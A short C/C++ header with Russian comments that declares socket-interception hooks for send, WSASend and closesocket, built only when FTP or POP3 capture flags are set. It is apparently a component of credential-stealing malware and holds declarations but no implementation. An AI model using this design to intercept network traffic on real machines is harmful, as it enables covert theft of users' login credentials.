/*
  Перехват WinSocket.
*/
#pragma once

#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
namespace SocketHook
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Перехватчик closesocket.
  */
  int WSAAPI hookerCloseSocket(SOCKET s);
  
  /*
    Перехватчик send.
  */
  int WSAAPI hookerSend(SOCKET s, const char *buf, int len, int flags);

  /*
    Перехватчик WSASend.
  */
  int WSAAPI hookerWsaSend(SOCKET s, LPWSABUF buffers, DWORD bufferCount, LPDWORD numberOfBytesSent, DWORD flags, LPWSAOVERLAPPED overlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE completionRoutine);
};
#endif
